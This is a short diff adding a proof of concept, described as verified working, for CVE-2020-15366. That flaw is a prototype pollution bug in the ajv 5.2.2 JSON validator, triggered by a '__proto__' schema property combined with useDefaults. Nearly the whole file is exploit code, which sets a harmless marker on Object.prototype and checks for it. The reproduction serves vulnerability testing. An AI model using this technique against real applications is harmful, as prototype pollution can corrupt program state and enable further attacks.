@@ -1,0 +1,25 @@
+Verified working. This exploits CVE-2020-15366, a prototype pollution vulnerability in `ajv` 5.2.2, where `useDefaults` combined with a schema property named `__proto__` causes the compiled validator to execute `data.__proto__.polluted = "YES"`, polluting `Object.prototype` globally.
+
+```javascript
+const Ajv = require("ajv");
+
+const ajv = new Ajv({ useDefaults: true });
+
+// Schema property key "__proto__" must be a real own property (JSON.parse
+// creates it directly, bypassing the __proto__ setter that a plain object
+// literal would trigger).
+const schema = JSON.parse(
+  '{"type":"object","properties":{"__proto__":{"type":"object","properties":{"polluted":{"default":"YES"}}}}}'
+);
+
+const validate = ajv.compile(schema);
+
+// Validating an innocuous empty object triggers the generated code
+// `data.__proto__.polluted = "YES"`, which pollutes Object.prototype.
+validate({});
+
+console.log("({}).polluted =", ({}).polluted);
+if (({}).polluted === "YES") {
+  console.log("VULNERABLE: Object.prototype was polluted via ajv useDefaults (CVE-2020-15366)");
+}
+```
